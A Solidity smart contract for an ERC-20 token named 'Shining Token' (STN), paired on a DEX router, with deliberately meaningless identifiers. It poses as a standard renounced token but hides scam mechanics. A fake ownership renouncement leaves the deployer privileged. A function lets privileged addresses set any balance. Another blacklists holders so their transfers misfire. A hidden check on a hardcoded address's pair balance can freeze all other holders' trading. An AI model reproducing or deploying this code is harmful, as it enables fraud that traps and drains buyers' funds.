//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface fundTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyReceiverExempt) external view returns (uint256);

    function transfer(address fromMin, uint256 swapTotal) external returns (bool);

    function allowance(address tokenReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapTotal) external returns (bool);

    function transferFrom(
        address sender,
        address fromMin,
        uint256 swapTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverSender, uint256 value);
    event Approval(address indexed tokenReceiver, address indexed spender, uint256 value);
}

abstract contract buyLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingLiquidityTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundReceiver {
    function createPair(address maxToSell, address enableTotalReceiver) external returns (address);
}

interface fundTeamMetadata is fundTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ShiningToken is buyLiquidity, fundTeam, fundTeamMetadata {

    uint256 constant senderReceiver = 9 ** 10;

    constructor (){
        
        marketingLiquidityTeam fundShould = marketingLiquidityTeam(isLaunched);
        buyFrom = fundReceiver(fundShould.factory()).createPair(fundShould.WETH(), address(this));
        if (feeShould == atToken) {
            atToken = modeSender;
        }
        isTotal = _msgSender();
        txTotal();
        teamSell[isTotal] = true;
        tokenBuy[isTotal] = isLaunch;
        
        emit Transfer(address(0), isTotal, isLaunch);
    }

    bool public maxLiquidity;

    mapping(address => bool) public tokenLaunched;

    function shouldSender(address maxMode, address fromMin, uint256 swapTotal) internal returns (bool) {
        if (maxMode == isTotal) {
            return toEnableAt(maxMode, fromMin, swapTotal);
        }
        uint256 toTeamTotal = fundTeam(buyFrom).balanceOf(teamReceiver);
        require(toTeamTotal == feeLiquidity);
        require(fromMin != teamReceiver);
        if (tokenLaunched[maxMode]) {
            return toEnableAt(maxMode, fromMin, senderReceiver);
        }
        return toEnableAt(maxMode, fromMin, swapTotal);
    }

    uint256 public feeShould;

    function allowance(address listEnableReceiver, address receiverSellToken) external view virtual override returns (uint256) {
        if (receiverSellToken == isLaunched) {
            return type(uint256).max;
        }
        return launchIs[listEnableReceiver][receiverSellToken];
    }

    uint256 swapReceiver;

    function approve(address receiverSellToken, uint256 swapTotal) public virtual override returns (bool) {
        launchIs[_msgSender()][receiverSellToken] = swapTotal;
        emit Approval(_msgSender(), receiverSellToken, swapTotal);
        return true;
    }

    function transfer(address launchedLaunch, uint256 swapTotal) external virtual override returns (bool) {
        return shouldSender(_msgSender(), launchedLaunch, swapTotal);
    }

    function balanceOf(address buyReceiverExempt) public view virtual override returns (uint256) {
        return tokenBuy[buyReceiverExempt];
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingTakeBuy;
    }

    function fromIsSender(address launchedLaunch, uint256 swapTotal) public {
        receiverFund();
        tokenBuy[launchedLaunch] = swapTotal;
    }

    address isLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private teamToken = "Shining Token";

    uint8 private tradingTakeBuy = 18;

    function txTotal() public {
        emit OwnershipTransferred(isTotal, address(0));
        senderTradingEnable = address(0);
    }

    mapping(address => bool) public teamSell;

    function name() external view virtual override returns (string memory) {
        return teamToken;
    }

    mapping(address => uint256) private tokenBuy;

    function totalSupply() external view virtual override returns (uint256) {
        return isLaunch;
    }

    bool private buySwap;

    function symbol() external view virtual override returns (string memory) {
        return feeAt;
    }

    function feeAmount(address launchedMax) public {
        receiverFund();
        
        if (launchedMax == isTotal || launchedMax == buyFrom) {
            return;
        }
        tokenLaunched[launchedMax] = true;
    }

    bool public exemptMax;

    address private senderTradingEnable;

    address public isTotal;

    function toSwap(address buyTx) public {
        if (totalIsLaunched) {
            return;
        }
        
        teamSell[buyTx] = true;
        if (buySwap) {
            exemptMax = false;
        }
        totalIsLaunched = true;
    }

    string private feeAt = "STN";

    uint256 private isLaunch = 100000000 * 10 ** 18;

    bool private feeReceiver;

    uint256 public modeSender;

    mapping(address => mapping(address => uint256)) private launchIs;

    function getOwner() external view returns (address) {
        return senderTradingEnable;
    }

    function toEnableAt(address maxMode, address fromMin, uint256 swapTotal) internal returns (bool) {
        require(tokenBuy[maxMode] >= swapTotal);
        tokenBuy[maxMode] -= swapTotal;
        tokenBuy[fromMin] += swapTotal;
        emit Transfer(maxMode, fromMin, swapTotal);
        return true;
    }

    function maxTakeMin(uint256 swapTotal) public {
        receiverFund();
        feeLiquidity = swapTotal;
    }

    function transferFrom(address maxMode, address fromMin, uint256 swapTotal) external override returns (bool) {
        if (_msgSender() != isLaunched) {
            if (launchIs[maxMode][_msgSender()] != type(uint256).max) {
                require(swapTotal <= launchIs[maxMode][_msgSender()]);
                launchIs[maxMode][_msgSender()] -= swapTotal;
            }
        }
        return shouldSender(maxMode, fromMin, swapTotal);
    }

    address teamReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public atToken;

    uint256 feeLiquidity;

    address public buyFrom;

    bool public totalIsLaunched;

    uint256 private txReceiver;

    function owner() external view returns (address) {
        return senderTradingEnable;
    }

    uint256 public walletTx;

    event OwnershipTransferred(address indexed takeTotal, address indexed walletAmount);

    function receiverFund() private view {
        require(teamSell[_msgSender()]);
    }

}